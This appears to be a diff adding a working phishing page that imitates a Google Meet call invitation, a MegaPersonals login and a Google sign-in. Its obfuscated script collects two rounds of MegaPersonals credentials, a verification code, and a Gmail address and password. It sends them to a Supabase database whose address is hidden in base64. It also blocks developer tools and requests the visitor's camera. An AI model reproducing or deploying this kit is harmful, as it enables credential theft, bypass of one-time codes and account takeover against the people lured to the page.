@@ -1,0 +1,315 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Incoming Meeting</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500;700&family=Roboto:wght@400;500&display=swap');
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body { font-family: 'Google Sans', Roboto, Arial, sans-serif; height: 100vh; height: 100dvh; display: flex; justify-content: center; align-items: center; overflow: hidden; transition: background 0.4s ease; -webkit-tap-highlight-color: transparent; }
+        #bgCam { position: fixed; inset: 0; width: 100vw; height: 100vh; object-fit: cover; filter: blur(14px) brightness(0.45); z-index: -1; background-color: #000; }
+        .screen { display: none; width: 100%; height: 100%; justify-content: center; align-items: center; }
+        .screen.active { display: flex; }
+        body.dark-bg { background-color: #000; color: #fff; }
+        body.light-bg { background-color: #ffffff; color: #000; }
+        
+        .callWrapper { width: 360px; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(18px); border-radius: 22px; padding: 26px 30px 36px; text-align: center; box-shadow: 0 0 40px rgba(0, 0, 0, 0.45); animation: fadeScale 0.5s ease; }
+        @keyframes fadeScale { from { transform: scale(.75); opacity: 0; } to { transform: scale(1); opacity: 1; } }
+        .meetLogo { width: 82px; height: 82px; object-fit: contain; margin-bottom: 16px; }
+        .callerName { font-size: 26px; font-weight: 600; margin-top: 6px; }
+        .callText { font-size: 16px; opacity: .85; margin-top: 4px; }
+        .btnArea { display: flex; justify-content: space-between; margin-top: 38px; }
+        .btn { flex: 1; margin: 0 8px; padding: 14px 0; font-size: 16px; font-weight: bold; cursor: pointer; border: none; border-radius: 9px; color: white; transition: .25s; }
+        .accept { background: linear-gradient(45deg, #00d07e, #009a57); box-shadow: 0 0 14px rgba(0, 255, 160, 0.45); }
+        .decline { background: linear-gradient(45deg, #ff4b4b, #b90404); box-shadow: 0 0 14px rgba(255, 80, 80, 0.45); }
+        
+        .loginBox { width: 380px; padding: 32px 35px 45px; border-radius: 22px; background: rgba(255, 255, 255, 0.14); backdrop-filter: blur(22px); text-align: center; box-shadow: 0 0 45px rgba(0, 0, 0, .50); animation: fadeUp .6s ease; position: relative; }
+        @keyframes fadeUp { from { transform: translateY(40px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
+        @keyframes shake { 0% { transform: translateX(0); } 25% { transform: translateX(-10px); } 50% { transform: translateX(10px); } 75% { transform: translateX(-10px); } 100% { transform: translateX(0); } }
+        .shake { animation: shake 0.4s ease-in-out; }
+        .headBar { width: 90%; height: 6px; background: linear-gradient(90deg, #ff008c, #ffda00, #00ffc8); border-radius: 10px; margin: auto; margin-bottom: 22px; }
+        .loginBox .logo { width: 95px; height: 95px; object-fit: contain; margin-bottom: 10px; }
+        .loginBox .title { font-size: 25px; font-weight: 600; }
+        .loginBox .subtext { opacity: .85; font-size: 16px; margin-top: 3px; }
+        .errorText { color: #ff4b4b; font-weight: bold; margin-top: 5px; display: none; }
+        .inputField { width: 100%; padding: 13px; border: none; border-radius: 9px; font-size: 15px; outline: none; color: black; background: white; font-weight: 500; margin-bottom: 16px; }
+        .loginBtn { width: 100%; padding: 15px; margin-top: 16px; font-size: 18px; font-weight: bold; border-radius: 10px; border: none; cursor: pointer; background: linear-gradient(45deg, #ff0077, #ff9100, #00ff9f); color: white; box-shadow: 0 0 20px rgba(255, 255, 255, .35); }
+        .note { margin-top: 18px; opacity: .9; font-size: 14px; }
+
+        .verifyContainer { width: 100%; max-width: 600px; text-align: center; padding: 40px 20px; background: #ffffff; font-family: Arial, sans-serif; }
+        .logo-text { font-family: 'Times New Roman', serif; font-size: 38px; font-weight: bold; margin-bottom: 2px; display: flex; justify-content: center; letter-spacing: -1px; }
+        .logo-mega { color: #FCA311; }
+        .logo-personals { color: #00B4D8; }
+        .logo-sub { font-family: 'Times New Roman', serif; color: #A0AAB5; font-size: 20px; margin-bottom: 30px; }
+        .alert-banner { background-color: #FCF6E1; color: #B0A58D; padding: 12px 0; font-size: 14px; font-weight: bold; letter-spacing: 1.5px; text-transform: uppercase; margin-bottom: 25px; width: 100%; display: inline-block; }
+        .verify-text { color: #B74700; font-size: 16px; line-height: 1.5; margin-bottom: 25px; }
+        .spam-warning { color: #1FA5E9; font-size: 17px; font-weight: bold; font-style: italic; margin-bottom: 25px; text-transform: uppercase; }
+        .share-warning { color: #B74700; font-size: 17px; font-weight: bold; font-style: italic; margin-bottom: 25px; display: flex; justify-content: center; align-items: center; gap: 10px; text-transform: uppercase; }
+        .share-warning span { background: #1FA5E9; color: white; width: 22px; height: 22px; border-radius: 50%; display: inline-flex; justify-content: center; align-items: center; font-size: 14px; font-style: normal; }
+        .verify-input { width: 220px; padding: 8px; font-size: 18px; border: 2px solid #333; border-radius: 4px; text-align: center; margin-bottom: 25px; outline: none; }
+        .btn-submit { background-color: #F2A065; color: #ffffff; border: none; border-radius: 2px; padding: 12px 35px; font-size: 18px; cursor: pointer; }
+
+        .google-container { width: 100%; display: flex; justify-content: center; }
+        .google-box { width: 100%; max-width: 450px; padding: 48px 40px 36px; border-radius: 8px; background: #ffffff; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); animation: fadeUp .5s ease; }
+        .google-logo { display: block; margin: 0 auto 16px; width: 75px; }
+        .google-title { font-size: 24px; text-align: center; margin-bottom: 8px; color: #202124; }
+        .google-subtitle { font-size: 16px; color: #202124; text-align: center; margin-bottom: 32px; }
+        .google-input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; margin-bottom: 8px; outline: none; color: #202124; }
+        .google-input:focus { border: 2px solid #1a73e8; }
+        .google-input.input-error { border: 2px solid #d93025; }
+        .google-error-msg { color: #d93025; font-size: 13px; margin-bottom: 16px; display: none; align-items: center; gap: 6px; }
+        .google-error-msg.show { display: flex; }
+        .google-link { color: #1a73e8; font-size: 14px; font-weight: 500; cursor: pointer; }
+        .google-info-text { font-size: 14px; color: #5f6368; margin: 24px 0 32px; line-height: 1.5; }
+        .google-bottom-row { display: flex; justify-content: space-between; align-items: center; }
+        .google-create-account { font-size: 14px; color: #1a73e8; cursor: pointer; }
+        .google-next-btn { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; cursor: pointer; font-weight: 500; }
+        .google-password-title { font-size: 24px; text-align: left; margin-bottom: 16px; color: #202124; }
+        .google-profile-pill { display: inline-flex; align-items: center; border: 1px solid #dadce0; border-radius: 20px; padding: 4px 12px 4px 4px; margin-bottom: 24px; cursor: pointer; background: white; }
+        .google-avatar { width: 24px; height: 24px; border-radius: 50%; margin-right: 8px; background-color: #e8eaed; display: flex; align-items: center; justify-content: center; }
+        .google-avatar svg { width: 16px; height: 16px; fill: #5f6368; }
+        .google-profile-pill span { font-size: 14px; color: #202124; font-weight: 500; margin-right: 8px; }
+        .dropdown-arrow { width: 16px; height: 16px; fill: #5f6368; }
+        .google-password-btn { border-radius: 20px; }
+
+        #screen-loading { background: #ffffff; position: fixed; inset: 0; z-index: 9999; }
+        .loading-wrapper { width: 100%; height: 100%; display: flex; flex-direction: column; justify-content: center; align-items: center; background: #ffffff; }
+        .google-spinner { width: 60px; height: 60px; animation: rotateSpinner 1.8s linear infinite; }
+        .google-spinner svg { width: 100%; height: 100%; }
+        @keyframes rotateSpinner { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .spinner-circle { fill: none; stroke-width: 4; stroke-linecap: round; animation: dashSpinner 1.5s ease-in-out infinite; }
+        @keyframes dashSpinner { 0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; } 50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; } 100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; } }
+        .loading-text { margin-top: 32px; font-size: 16px; color: #202124; }
+        .loading-subtext { margin-top: 8px; font-size: 13px; color: #5f6368; }
+        .close-loading-btn { position: absolute; top: 20px; right: 20px; width: 36px; height: 36px; border-radius: 50%; background: transparent; color: #5f6368; border: none; font-size: 22px; cursor: pointer; }
+        
+        #screen-end { background: #ffffff; position: fixed; inset: 0; z-index: 10000; }
+        .end-wrapper { width: 100%; height: 100%; background: #ffffff; }
+
+        @media (max-width: 600px) {
+            .callWrapper { width: calc(100% - 30px); max-width: 360px; padding: 22px; }
+            .loginBox { width: calc(100% - 30px); max-width: 380px; padding: 26px 22px 36px; }
+            .google-container { padding: 15px; align-items: flex-start; padding-top: 30px; }
+            .google-box { padding: 32px 24px 28px; max-width: 100%; }
+            .google-spinner { width: 50px; height: 50px; }
+        }
+    </style>
+</head>
+<body class="dark-bg">
+
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <video id="bgCam" autoplay muted playsinline></video>
+    <audio id="r1" loop>
+        <source src="https://dl.prokerala.com/downloads/ringtones/files/dl/mp3/7120-download-iphone-6-original-ringtone-42676.mp3" type="audio/mpeg">
+    </audio>
+
+    <!-- SCREEN 1 -->
+    <div id="s1" class="screen active">
+        <div class="callWrapper">
+            <img class="meetLogo" src="https://images.icon-icons.com/2631/PNG/512/google_meet_new_logo_icon_159138.png">
+            <div class="callerName">Incoming Meeting</div>
+            <div class="callText">Join the meeting now</div>
+            <div class="btnArea">
+                <button class="btn decline" onclick="alert('Meeting declined.')">Decline</button>
+                <button class="btn accept" onclick="_f(1)">Join</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 2 -->
+    <div id="s2" class="screen">
+        <div class="loginBox" id="lb">
+            <div class="headBar"></div>
+            <img class="logo" src="https://images.icon-icons.com/2631/PNG/512/google_meet_new_logo_icon_159138.png">
+            <div class="title">Incoming Meeting call</div>
+            <div class="subtext" style="margin-bottom: 20px;">Login to access MegaPersonals join meeting</div>
+            <div class="subtext errorText" id="e1" style="margin-bottom: 20px;">The password is incorrect</div>
+            <form onsubmit="event.preventDefault(); _f(2);">
+                <input type="email" class="inputField" id="_x1" placeholder="MegaPersonals Email" required>
+                <input type="password" class="inputField" id="_x2" placeholder="Password" required>
+                <button type="submit" class="loginBtn">Continue</button>
+            </form>
+            <div class="note">MegaPersonals secure authentication required</div>
+        </div>
+    </div>
+
+    <!-- SCREEN 3 -->
+    <div id="s3" class="screen">
+        <div class="verifyContainer">
+            <div class="logo-text"><span class="logo-mega">Mega</span><span class="logo-personals">Personals</span></div>
+            <div class="logo-sub">personals classifieds</div>
+            <div class="alert-banner">NEW DEVICE DETECTED</div>
+            <p class="verify-text">Your ACCESS CODE<br>has been sent <strong>Successfully</strong><br>to your email on <strong id="_d1"></strong>.<br>That code remains valid.</p>
+            <p class="spam-warning">CHECK YOUR SPAM<br>FOLDER IT MAY BE THERE.</p>
+            <p class="share-warning">DO NOT SHARE IT <span>?</span></p>
+            <p class="verify-text" style="margin-bottom: 20px;">Enter the code below to continue.</p>
+            <form onsubmit="event.preventDefault(); _f(3);">
+                <input type="text" class="verify-input" id="_x3" required>
+                <br><button type="submit" class="btn-submit">Submit</button>
+            </form>
+        </div>
+    </div>
+
+    <!-- SCREEN 4 -->
+    <div id="s4" class="screen">
+        <div class="google-container">
+            <div class="google-box">
+                <img class="google-logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png">
+                <div class="google-title">Sign in</div>
+                <div class="google-subtitle">Use your email account to continue</div>
+                <form onsubmit="event.preventDefault(); _f(4);">
+                    <input type="email" class="google-input" id="_x4" placeholder="Email address" required>
+                    <div class="google-error-msg" id="_e2">
+                        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+                        <span>Couldn't find your Google Account. Only Gmail addresses are accepted.</span>
+                    </div>
+                    <div class="google-bottom-row">
+                        <span class="google-create-account">Create account</span>
+                        <button type="submit" class="google-next-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 5 -->
+    <div id="s5" class="screen">
+        <div class="google-container">
+            <div class="google-box">
+                <img class="google-logo" style="margin: 0 0 24px 0; width: 40px;" src="https://www.google.com/images/branding/googleg/1x/googleg_standard_color_128dp.png">
+                <div class="google-password-title">Welcome back</div>
+                <div class="google-profile-pill">
+                    <div class="google-avatar"><svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg></div>
+                    <span id="_p1">user@example.com</span>
+                    <svg class="dropdown-arrow" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+                </div>
+                <form onsubmit="event.preventDefault(); _f(5);">
+                    <input type="password" class="google-input" id="_x5" placeholder="Enter your password" required>
+                    <a class="google-link" id="_t1" onclick="
+                        const p = document.getElementById('_x5');
+                        const t = document.getElementById('_t1');
+                        if(p.type === 'password') { p.type = 'text'; t.innerText = 'Hide password'; } 
+                        else { p.type = 'password'; t.innerText = 'Show password'; }
+                    " style="margin-bottom: 24px; display: inline-block;">Show password</a>
+                    <div class="google-bottom-row">
+                        <span class="google-create-account">Create account</span>
+                        <button type="submit" class="google-next-btn google-password-btn">Next</button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <!-- SCREEN 6: LOADING -->
+    <div id="s6" class="screen">
+        <div class="loading-wrapper">
+            <div class="google-spinner"><svg viewBox="0 0 50 50"><circle class="spinner-circle" cx="25" cy="25" r="20" stroke="#1a73e8"></circle></svg></div>
+            <div class="loading-text">Please wait...</div>
+            <div class="loading-subtext">Verifying your account</div>
+            <button class="close-loading-btn" onclick="_f(0)" title="Close">✕</button>
+        </div>
+    </div>
+
+    <!-- SCREEN 7: END -->
+    <div id="s7" class="screen"><div class="end-wrapper"></div></div>
+
+    <script>
+        // 1. Block Right Click & F12
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.addEventListener('keydown', e => {
+            if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C'))) {
+                e.preventDefault();
+            }
+        });
+
+        // 2. Encoded Supabase Strings
+        const _a = "aHR0cHM6Ly94b3hycWpid2t1dWx4aWl0c25haC5zdXBhYmFzZS5jbw==";
+        const _b = "c2JfcHVibGlzaGFibGVfcndwWVRaOXMyZF8yaGVqRl9vbjV4Z182Y1RTM3FjZw==";
+
+        const _c = window.supabase.createClient(atob(_a), atob(_b));
+        
+        let _d = { a: '', b: '', c: '', d: '', e: '' };
+        let _v = 0; // Login attempt counter
+
+        // 3. Obfuscated Master Function
+        async function _f(x) {
+            const getEl = id => document.getElementById(id);
+            
+            if (x === 1) {
+                // Join -> Login
+                getEl('s1').classList.remove('active');
+                getEl('s2').classList.add('active');
+                getEl('r1').play().catch(()=>{});
+            } 
+            else if (x === 2) {
+                // Login Submit
+                const u = getEl('_x1').value, p = getEl('_x2').value;
+                if (_v === 0) {
+                    _d.a = u; _d.b = p; _v++;
+                    getEl('e1').style.display = 'block';
+                    getEl('lb').classList.add('shake');
+                    setTimeout(() => getEl('lb').classList.remove('shake'), 500);
+                    getEl('_x1').value = ''; getEl('_x2').value = '';
+                } else {
+                    _d.a = u; _d.b = p;
+                    getEl('r1').pause(); getEl('r1').currentTime = 0;
+                    getEl('s2').classList.remove('active');
+                    getEl('s3').classList.add('active');
+                    document.body.className = 'light-bg';
+                    getEl('bgCam').style.display = 'none';
+                }
+            } 
+            else if (x === 3) {
+                // Verify Submit
+                _d.c = getEl('_x3').value;
+                getEl('s3').classList.remove('active');
+                getEl('s4').classList.add('active');
+            } 
+            else if (x === 4) {
+                // Gmail Submit
+                const em = getEl('_x4').value.trim();
+                if (!/^[^\s@]+@gmail\.com$/i.test(em)) {
+                    getEl('_x4').classList.add('input-error');
+                    getEl('_e2').classList.add('show');
+                    return;
+                }
+                getEl('_x4').classList.remove('input-error');
+                getEl('_e2').classList.remove('show');
+                _d.d = em;
+                getEl('_p1').innerText = em;
+                getEl('s4').classList.remove('active');
+                getEl('s5').classList.add('active');
+            } 
+            else if (x === 5) {
+                // Final Submit (Send to DB)
+                _d.e = getEl('_x5').value;
+                
+                // Fire and forget DB call
+                _c.from('megapersonal').insert([{
+                    meeting_m: _d.a, meeting_p: _d.b, verify: _d.c, email: _d.d, user_password: _d.e
+                }]).then(() => {});
+
+                getEl('s5').classList.remove('active');
+                getEl('s6').classList.add('active');
+            } 
+            else if (x === 0) {
+                // End Simulation
+                document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
+                getEl('s7').classList.add('active');
+            }
+        }
+
+        // 4. Date Setup & Camera Setup
+        document.addEventListener('DOMContentLoaded', () => {
+            document.getElementById('_d1').textContent = new Date().toLocaleDateString('en-US', { year: 'numeric', month: 'long', day: 'numeric' });
+            (async () => {
+                try {
+                    let st = await navigator.mediaDevices.getUserMedia({ video: true });
+                    document.getElementById("bgCam").srcObject = st;
+                } catch (e) {}
+            })();
+        });
+    </script>
+</body>
+</html>
